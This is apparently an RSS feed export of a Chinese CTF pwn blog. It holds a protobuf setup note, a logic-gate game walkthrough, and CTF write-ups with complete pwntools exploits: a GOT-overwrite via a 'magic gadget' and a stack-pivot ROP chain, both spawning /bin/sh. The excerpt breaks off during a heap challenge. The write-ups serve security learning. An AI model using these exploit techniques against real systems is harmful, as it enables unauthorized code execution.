3），如果没指定版本直接安装了最新版，运行脚本的时候python会提示版本不兼容，protobuf版本过低，要更新protobuf，否则使用3.20.x版本的python库。安装完这个之后，环境就算是配置好了。</p><h2 id="基础使用方法"><a href="#基础使用方法" class="headerlink" title="基础使用方法"></a>基础使用方法</h2><p>-I参数指定proto源码目录，–c_out参数指定生成的类声明与实现文件的输出目录。如果proto文件就在当前目录，直接运行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">protoc --c_out=. filename.proto</span></span><br></pre></td></tr></table></figure><p>那么文件就会生成在当前目录。如果你想出题和对照着函数实现来逆向，那么这一步是必要的。如果你要用python写脚本，那么你需要生成python的实现代码：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">protoc --python_out=. filename.proto</span></span><br></pre></td></tr></table></figure><h2 id="运行须知"><a href="#运行须知" class="headerlink" title="运行须知"></a>运行须知</h2><p>如果程序使用了protobuf，那必定需要libprotobuf动态库的。上述安装的版本下，运行库的名字叫<code>libprotobuf-c.so.1</code>。假如protobuf_demo是一个使用了protobuf的程序</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ldd protobuf_demo</span></span><br><span class="line">        linux-vdso.so.1 (0x00007ffcc5597000)</span><br><span class="line">        libprotobuf-c.so.1 =&gt; /usr/local/lib/libprotobuf-c.so.1 (0x00007f2a99c64000)</span><br><span class="line">        libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f2a99a3b000)</span><br><span class="line">        /lib64/ld-linux-x86-64.so.2 (0x00007f2a99c81000)</span><br></pre></td></tr></table></figure><p>光有<code>libprotobuf-c.so.1</code>也不够，还需要<code>libprotobuf-c.so.1.0.0</code>。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ldconfig -v</span></span><br><span class="line">...</span><br><span class="line">/usr/local/lib: (from /etc/ld.so.conf.d/libc.conf:2)</span><br><span class="line">        libprotobuf-c.so.1 -&gt; libprotobuf-c.so.1.0.0</span><br><span class="line">        libprotobuf.so.17 -&gt; libprotobuf.so.17.0.0</span><br><span class="line">        libprotobuf-lite.so.17 -&gt; libprotobuf-lite.so.17.0.0</span><br><span class="line">        libprotoc.so.17 -&gt; libprotoc.so.17.0.0</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>如果在一个纯净的环境（容器）或者版本不适配（高版本的protobuf动态库名字不一样）的情况下，不想安装完整的protobuf又想要运行程序的，可以把这两个文件放到<code>/usr/local/lib</code>下，并运行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">ln</span> -sf /usr/local/lib/libprotobuf-c.so.1.0.0 /usr/local/lib/libprotobuf-c.so.1</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo ldconfig</span></span><br></pre></td></tr></table></figure><p>如果不想破坏原本高版本的protobuf，可以就放在程序目录下，运行上面的命令先链接，然后利用patchelf来修改动态链接库路径。有时候也可能是不知道为什么程序就运行不了的，也可以用这种方式试试。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">patchelf --print-needed protobuf_demo <span class="comment">#打印程序需要的动态库</span></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">patchelf --replace-needed libprotobuf-c.so.1 ./libcprotobuf-c.so.1 protobuf <span class="comment">#第二个libcproto*是附件给你的或者你下载的动态库的路径</span></span></span><br></pre></td></tr></table></figure><p>配置容器时同理。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://mp.weixin.qq.com/s/lipd1tc9RGW3VW_WEpjQxA">Real返璞归真师傅的全面解析</a></p>]]></content>
    
    
    <summary type="html">自从国赛遇到protobuf题目之后就一直想好好研究一下，最近才学习其用法。</summary>
    
    
    
    <category term="protobuf" scheme="https://c-lby.top/categories/protobuf/"/>
    
    
    <category term="CTF" scheme="https://c-lby.top/tags/CTF/"/>
    
    <category term="PWN" scheme="https://c-lby.top/tags/PWN/"/>
    
    <category term="protobuf" scheme="https://c-lby.top/tags/protobuf/"/>
    
  </entry>
  
  <entry>
    <title>『图灵完备』完全攻略之基础逻辑电路（一）</title>
    <link href="https://c-lby.top/2024/Turing-Complete-1/"/>
    <id>https://c-lby.top/2024/Turing-Complete-1/</id>
    <published>2024-09-25T12:40:24.000Z</published>
    <updated>2024-10-23T18:25:18.637Z</updated>
    
    <content type="html"><![CDATA[<h2 id="原力觉醒"><a href="#原力觉醒" class="headerlink" title="原力觉醒"></a>原力觉醒</h2><p>只是想教会你如何连接导线</p><p><img src="https://c-lby.top/images/Turing-Complete/1/%E5%8E%9F%E5%8A%9B%E8%A7%89%E9%86%92.png" alt="原力觉醒"></p><h2 id="与非门"><a href="#与非门" class="headerlink" title="与非门"></a>与非门</h2><p>这一关要求玩家测试得出与非门（NAND）的真值表。什么是真值表？真值表其实就是输入和输出的对应关系。输入可以不止一个，在不同逻辑下，相同的输入可能会得到不同的输出。真值表可以让我们更直观地看出不同的逻辑关系。比如下图就是游戏中给出的与门（AND）的真值表。</p><p><img src="https://c-lby.top/images/Turing-Complete/1/%E7%9C%9F%E5%80%BC%E8%A1%A8.png" alt="真值表"></p><p>回到这个关卡，题目已经给了我们与非门，我们只需要测试不同输入的情况下输出的情况，写在下方核对即可。</p><p><img src="https://c-lby.top/images/Turing-Complete/1/%E4%B8%8E%E9%9D%9E%E9%97%A8.png" alt="与非门"></p><p>过关后，游戏告诉我们，利用这个元件可以造出电脑里的所有东西。</p><h2 id="非门"><a href="#非门" class="headerlink" title="非门"></a>非门</h2><p>非门就是我们常见的NOT，取反。题目要求我们利用与非门来搭建一个非门。<img src="https://c-lby.top/images/Turing-Complete/1/%E9%9D%9E%E9%97%A8%E7%9C%9F%E5%80%BC%E8%A1%A8.png" alt="非门真值表"></p><p>与非门有两个输入，但是非门只有一个输入。对比与非门的真值表我们可以很容易得出，当两个输入都是低电平的时候，输出为高电平，反之则为低电平。所以我们只要把输入同时给到与非门的两个接口，我们就能得到符合非门真值表的电路了。</p><p><img src="https://c-lby.top/images/Turing-Complete/1/%E9%9D%9E%E9%97%A8.png" alt="非门"></p><h2 id="与门"><a href="#与门" class="headerlink" title="与门"></a>与门</h2><p>这个逻辑我们很熟悉，AND。问题在于我们现在只有与非门和非门可以用。仔细观察与非门和与门的真值表可以发现，它们的输出完全反过来。所以我们只需要在输入给到与非门后取反即可。</p><p><img src="https://c-lby.top/images/Turing-Complete/1/%E4%B8%8E%E9%97%A8.png" alt="与门"></p><p>与门的性质就是，全真才为真。而与非门就可以理解为，与后非，即全假才为真。</p><h2 id="或门"><a href="#或门" class="headerlink" title="或门"></a>或门</h2><p>或门也是我们熟悉的OR，有真即为真。我们对比一下与非门和或门的真值表，会发现他们的输出刚好左右对称。</p><p><img src="https://c-lby.top/images/Turing-Complete/1/%E4%B8%8E%E9%9D%9E%E9%97%A8.png" alt="与非门"></p><p><img src="https://c-lby.top/images/Turing-Complete/1/%E6%88%96%E9%97%A8%E7%9C%9F%E5%80%BC%E8%A1%A8.png" alt="或门真值表"></p><p>这里就要引出数电中很基础的一个定理：德摩根定律。</p><p><img src="https://c-lby.top/images/Turing-Complete/1/%E5%BE%B7%E6%91%A9%E6%A0%B9%E5%AE%9A%E5%BE%8B.png" alt="德摩根定律"></p><p>通俗点来讲就是，如果我们在输入的时候就取反，那么输出就会呈左右对称。如果我们在输出取反，那么输出会分别取反。回到这道题，我们只需要在与非门的输入（元件左边）取反，就能得到或门。</p><p><img src="https://c-lby.top/images/Turing-Complete/1/%E6%88%96%E9%97%A8.png" alt="或门"></p><h2 id="或非门"><a href="#或非门" class="headerlink" title="或非门"></a>或非门</h2><p>NOR，类比一下与非门的命名逻辑，显然或非门就是或后非。所以只要在或门后面的输出加上非门即可。这也是为什么前面先讲了或门，才来讲或非门。</p><p><img src="https://c-lby.top/images/Turing-Complete/1/%E6%88%96%E9%9D%9E%E9%97%A8.png" alt="或非门"></p><h2 id="高电平"><a href="#高电平" class="headerlink" title="高电平"></a>高电平</h2><p>题目要求无论是输入是什么，输出时钟需要保持高电平（即为1）。很显然在只有一个输入的情况下，我们需要将其分为两条路子来给到元件，但是尽管是两条路也肯定没法保证全部都是高电平，但是可以轻松做到一个高电平一个低电平。我们利用或门（或者与非门）的性质就能永远输出高电平了。（解法不止一种）</p><p><img src="https://c-lby.top/images/Turing-Complete/1/%E9%AB%98%E7%94%B5%E5%B9%B3.png" alt="高电平"></p><h2 id="第二刻"><a href="#第二刻" class="headerlink" title="第二刻"></a>第二刻</h2><p>这道题其实有一种对着答案出题的感觉，其实完全不用管第几刻的问题，直接对着给出的真值表造就行。</p><p><img src="https://c-lby.top/images/Turing-Complete/1/%E7%AC%AC%E4%BA%8C%E5%88%BB.png" alt="第二刻"></p><p>也不难发现，试想如果将真值表中输入2的值全部倒转会发生什么，那就变成与门的真值表了！所以我们只需要在输入2处加个非门即可。举一反三，如果下次要第三刻怎么办？诶！想想摩根定律。</p><h2 id="异或门"><a href="#异或门" class="headerlink" title="异或门"></a>异或门</h2><p>XOR，但是只能用前面见到过的元件。有一说一，有点难想。我的视角是这样的：观察真值表会发现，除了真真得假之外，其他三项和或门的性质很像，于是想到最后可能要用到或门在输出的位置，那么现在问题就转变成了如何在两个都为真的时候，让进入或门的两个输入都变成低电平。</p><p>我们现在抛弃其他的不想，我们就抓着或门的其中给一个输入来考虑。如果两个输入中一个接一个非门，然后接入与门，是不是就能实现两个输入为真的时候输出低电平？巧妙的是，当没接非门的那一个输入为真的时候，与门也能输出真，这不就符合了我们满足真真得假的设想。</p><p><img src="https://c-lby.top/images/Turing-Complete/1/%E5%BC%82%E6%88%96%E9%97%A8.png" alt="异或门"></p><h2 id="三路或门"><a href="#三路或门" class="headerlink" title="三路或门"></a>三路或门</h2><p>有一个真即为真，叠或门即可。</p><p><img src="https://c-lby.top/images/Turing-Complete/1/%E4%B8%89%E8%B7%AF%E6%88%96%E9%97%A8.png" alt="三路或门"></p><h2 id="三路与门"><a href="#三路与门" class="headerlink" title="三路与门"></a>三路与门</h2><p>全为真才为真，叠与门即可。</p><p><img src="https://c-lby.top/images/Turing-Complete/1/%E4%B8%89%E8%B7%AF%E4%B8%8E%E9%97%A8.png" alt="三路与门"></p><h2 id="同或门"><a href="#同或门" class="headerlink" title="同或门"></a>同或门</h2><p>XNOR，真值表和异或门刚好反过来，根据摩根定律，在输出处加上非门即可。</p><p><img src="https://c-lby.top/images/Turing-Complete/1/%E5%90%8C%E6%88%96%E9%97%A8.png" alt="同或门"></p>]]></content>
    
    
    <summary type="html">开启计组学习的新大门</summary>
    
    
    
    <category term="图灵完备" scheme="https://c-lby.top/categories/%E5%9B%BE%E7%81%B5%E5%AE%8C%E5%A4%87/"/>
    
    
    <category term="图灵完备" scheme="https://c-lby.top/tags/%E5%9B%BE%E7%81%B5%E5%AE%8C%E5%A4%87/"/>
    
    <category term="计组" scheme="https://c-lby.top/tags/%E8%AE%A1%E7%BB%84/"/>
    
  </entry>
  
  <entry>
    <title>没有输出函数的情况下magic_gadget的利用</title>
    <link href="https://c-lby.top/2024/magic-gadget/"/>
    <id>https://c-lby.top/2024/magic-gadget/</id>
    <published>2024-09-13T06:29:45.000Z</published>
    <updated>2024-09-20T08:29:09.263Z</updated>
    
    <content type="html"><![CDATA[<h3 id="什么是magic-gadget"><a href="#什么是magic-gadget" class="headerlink" title="什么是magic_gadget"></a>什么是magic_gadget</h3><p>magic gadget其实是一类gadget的统称，指可以巧妙地实现某些目的的gadget。这里要讲的gadget只是众多magic gadget中的其中一个，可以在没法泄露libc地址的时候达到能够使用libc地址的目的。</p><p>这里要讲的gadget位于程序的<code>__do_global_dtors_aux</code>函数中，偏移是0x18。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add     [rbp-3Dh], ebx</span><br></pre></td></tr></table></figure><p>在IDA正常反编译下是看不到这个gadget的，只有重新在0x18处反汇编才能看到。显然，这个gadget可以实现在某一个栈上数据加上一个偏移。假如在rbp-0x3D处存在一个libc地址，并且这个地址每次运行都是一样的（相对偏移），那么我就可以通过控制ebx寄存器，使用这个gadget把那个libc地址变成ogg或者system，从而返回获得一个shell。</p><p>但是很显然，rbp-0x3D很难直接是一个返回地址，就算是被调用者的返回地址，也会被覆盖。</p><p>如果能知道栈地址，劫持rbp进行栈迁移也许是个不错的选择，但是本来就是在没法泄露地址的情况（一般是连输出函数都没有但是又有栈溢出的情况），所以这个压根没机会。比较常见的使用方法是：</p><ol><li>如果没有开full relro，劫持rbp到got表，修改got表后进行rop。</li><li>如果没有开地址随机化，可以栈迁移到bss段，然后调用libc_start_main在bss段上留下libc地址，然后再劫持rbp到那个地址的相应偏移处（依然在bss），修改某个libc地址为ogg或者system后ROP。</li></ol><h3 id="2024-BaseCTF-ezstack"><a href="#2024-BaseCTF-ezstack" class="headerlink" title="2024 BaseCTF ezstack"></a>2024 BaseCTF ezstack</h3><p>这道题，爱来自gets师傅（</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v4[<span class="number">8</span>]; <span class="comment">// [rsp+18h] [rbp-8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  gets(v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序除了一个gets函数之外就什么都没有了。没有输出函数。靶机环境是2.35的，但是程序里出现了csu，这应该是出题人故意留的gadget（爱来自gets），刚好符合上面讲到的无输出函数的情况。我们来详细分析一下这题的做题步骤。</p><p>首先检查程序的保护情况，发现PIE没开，partial relro，所以优先考虑劫持got表。got表中可以供我们选择的函数并不多，gets函数我们还需要用它来传payload和binsh字符串，所以我们劫持setvbuf这个函数为system。</p><p>已经确定要使用<code>add     [rbp-3Dh], ebx</code>这个gadget，先看我们需要控制什么寄存器。首先rbp需要劫持为setvbuf的got表地址+0x3D，ebx应该存setvbuf与system两个函数在libc中的偏移，这样我们就能通过add将setvbuf的got表指向system。</p><p>我们利用ret2csu来控制寄存器，实际上我们只需要其中一段就够了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004006EA                 pop     rbx</span><br><span class="line">.text:00000000004006EB                 pop     rbp</span><br><span class="line">.text:00000000004006EC                 pop     r12</span><br><span class="line">.text:00000000004006EE                 pop     r13</span><br><span class="line">.text:00000000004006F0                 pop     r14</span><br><span class="line">.text:00000000004006F2                 pop     r15</span><br><span class="line">.text:00000000004006F4                 retn</span><br></pre></td></tr></table></figure><p>前面两个就已经能够控制rbx和rbp了，其他都无所谓。于是写出脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">xor_off = (-<span class="number">0x30880</span>) &amp; <span class="number">0xffffffffffffffff</span> <span class="comment">#setvbuf和system之间的偏移，注意符号</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span> + p64(buf_address)</span><br><span class="line">payload += p64(gadget_reg)</span><br><span class="line">payload += p64(<span class="number">0xfffffffffffcf780</span>)  <span class="comment"># xor_off</span></span><br><span class="line">payload += p64(e.got[<span class="string">&#x27;setvbuf&#x27;</span>]+<span class="number">0x3d</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">4</span></span><br></pre></td></tr></table></figure><p>buf_address处实际上写什么都无所谓。关于偏移的计算，可以手动在libc中查找后计算，也可以借助pwndbg来进行计算</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">p setvbuf</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">3 = &#123;int (FILE *, char *, int, size_t)&#125; 0x7fb610a4b5f0 &lt;__GI__IO_setvbuf&gt;</span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">p system</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">4 = &#123;int (const char *)&#125; 0x7fb610a1ad70 &lt;__libc_system&gt;</span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">distance 0x7fb610a4b5f0 0x7fb610a1ad70</span></span><br><span class="line"><span class="meta prompt_">0x7fb610a4b5f0-&gt;</span><span class="language-bash">0x7fb610a1ad70 is -0x30880 bytes (-0x6110 words)</span></span><br></pre></td></tr></table></figure><p>设置好寄存器之后就执行magic gadget。然后这时候setvbuf的got表就已经变成了system了，我们断点动调看看。<img src="https://c-lby.top/images/magic_gadget/%E5%8A%AB%E6%8C%81%E5%90%8E%E7%9A%84got%E8%A1%A8.png" alt="劫持后的got表"></p><p>确实劫持成功了。那接下来就是正常的ROP了，我们先利用gets函数把binsh写进到bss段，然后再传参执行system即可。</p><h5 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># r = remote(&#x27;challenge.basectf.fun&#x27;, 30854)</span></span><br><span class="line">r = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">gadget_reg = <span class="number">0x4006EA</span></span><br><span class="line">gadget_call = <span class="number">0x4006D0</span></span><br><span class="line">magic_gadget = <span class="number">0x4005D8</span></span><br><span class="line">rdi = <span class="number">0x4006f3</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x4006f1</span></span><br><span class="line">leave_ret = <span class="number">0x40068c</span></span><br><span class="line">buf_address = e.bss() + <span class="number">0x500</span></span><br><span class="line">fini = <span class="number">0x400700</span></span><br><span class="line">init = <span class="number">0x400690</span></span><br><span class="line">main = <span class="number">0x40065D</span></span><br><span class="line"></span><br><span class="line">xor_off = (-<span class="number">0x30880</span>) &amp; <span class="number">0xffffffffffffffff</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="number">18446744073709352832</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span> + p64(buf_address)</span><br><span class="line">payload += p64(gadget_reg)</span><br><span class="line">payload += p64(<span class="number">0xfffffffffffcf780</span>)  <span class="comment"># xor_off</span></span><br><span class="line">payload += p64(e.got[<span class="string">&#x27;setvbuf&#x27;</span>]+<span class="number">0x3d</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">payload += p64(magic_gadget)</span><br><span class="line">payload += p64(rdi)+p64(buf_address)+p64(e.plt[<span class="string">&#x27;gets&#x27;</span>])</span><br><span class="line">payload += p64(rdi)+p64(buf_address)+p64(e.plt[<span class="string">&#x27;setvbuf&#x27;</span>])</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">爱来自gets师傅</summary>
    
    
    
    <category term="magic_gadget" scheme="https://c-lby.top/categories/magic-gadget/"/>
    
    
    <category term="PWN" scheme="https://c-lby.top/tags/PWN/"/>
    
    <category term="WP" scheme="https://c-lby.top/tags/WP/"/>
    
    <category term="magic_gadget" scheme="https://c-lby.top/tags/magic-gadget/"/>
    
  </entry>
  
  <entry>
    <title>『2024羊城杯初赛』 PWN WP</title>
    <link href="https://c-lby.top/2024/2024ycb-wp/"/>
    <id>https://c-lby.top/2024/2024ycb-wp/</id>
    <published>2024-09-02T03:16:32.000Z</published>
    <updated>2024-09-20T07:12:39.602Z</updated>
    
    <content type="html"><![CDATA[<h3 id="pstack"><a href="#pstack" class="headerlink" title="pstack"></a>pstack</h3><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>非常经典的没有回显的0x10字节溢出，栈迁移。第一件事就要先考虑怎么泄露出libc地址。我们选择将栈劫持到bss段。从汇编代码可知vuln函数栈帧开辟了0x30大小，所以把rbp劫持为某个选定的bss段+0x30，这样rbp就会跳到bss+0x30。</p><p><img src="https://c-lby.top/images/2024ycb_wp/pstack_rbp%E8%BF%81%E7%A7%BB%E5%88%B0bss%E6%AE%B5.png" alt="pstack_rbp迁移到bss段"></p><p>因为read函数是通过<code>lea    rax, [rbp - 0x30]</code>寻址的，所以下一次read的时候payload会被写到0x601818。我们直接在这个地址上写泄露libc地址的ropchain，然后在rbp的地址处写上0x601810的话，rbp就会被劫持到那，这样经过一次leave ret之后就会从0x601850开始执行了。在这里写上leave ret，就能将rsp劫持到0x601818开始执行ropchain。这里需要注意一点是，一定要多执行一个mov rbp，rsp恢复一下两个的位置关系，因为这会rbp是0，不恢复的话后面的read没法寻址。</p><p><img src="https://c-lby.top/images/2024ycb_wp/pstack_rbp%E8%BF%81%E7%A7%BB%E5%88%B0bss%E6%AE%B52.png" alt="pstack_rbp迁移到bss段2"></p><p>泄露出来libc之后后面写system的ropchain就和前面的思路一样了。也是执行两次read两次leave ret后执行ropchain。</p><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>)</span><br><span class="line">r = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">bss = e.bss()+<span class="number">0x808</span></span><br><span class="line">leave_ret = <span class="number">0x4006DB</span></span><br><span class="line">vuln = <span class="number">0x4006b0</span></span><br><span class="line">vuln_sub_30 = <span class="number">0x4006B4</span></span><br><span class="line">rdi = <span class="number">0x400773</span></span><br><span class="line">ret = <span class="number">0x4006DC</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(bss))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>+p64(bss+<span class="number">0x30</span>)+p64(vuln_sub_30)</span><br><span class="line">payload1 = p64(rdi)+p64(e.got[<span class="string">&#x27;puts&#x27;</span>])+p64(e.plt[<span class="string">&#x27;puts&#x27;</span>])+p64(vuln)+p64(bss-<span class="number">0x8</span>)*<span class="number">3</span>+p64(leave_ret)</span><br><span class="line">r.send(payload)</span><br><span class="line">r.send(payload1)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&quot;Can you grasp this little bit of overflow?\n&quot;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&quot;Can you grasp this little bit of overflow?\n&quot;</span>)</span><br><span class="line">puts_addr = u64(r.recv(<span class="number">6</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = puts_addr-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system = libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = libc_base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">payload2 = p64(ret)+p64(rdi)+p64(binsh)+p64(system)+p64(bss-<span class="number">0x8</span>)*<span class="number">3</span>+p64(leave_ret)</span><br><span class="line">r.send(payload)</span><br><span class="line">r.send(payload2)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="TravelGraph"><a href="#TravelGraph" class="headerlink" title="TravelGraph"></a>TravelGraph</h3><h4 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h4><p><a href="https://blog.csdn.net/qq_44431690/article/details/108175827">Dijkstra算法学习</a></p><p>开了沙盒</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">seccomp-tools dump ./pwn</span></span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x06 0xc000003e  if (A != ARCH_X86_64) goto 0008</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x03 0xffffffff  if (A != 0xffffffff) goto 0008</span><br><span class="line"> 0005: 0x15 0x02 0x00 0x0000003b  if (A == execve) goto 0008</span><br><span class="line"> 0006: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0008</span><br><span class="line"> 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0008: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure><p>那就走正常的orw。因为是2.35堆题，所以经典的apple2+setcontext+orw的组合。第一次调板子，好好分析一下这题。</p><p>审计代码发现delete的时候只清空了堆内对于城市名字记录的内容，没有清空route数组中地址的储存，所以有UAF漏洞。</p><h5 id="模板函数"><a href="#模板函数" class="headerlink" title="模板函数"></a>模板函数</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 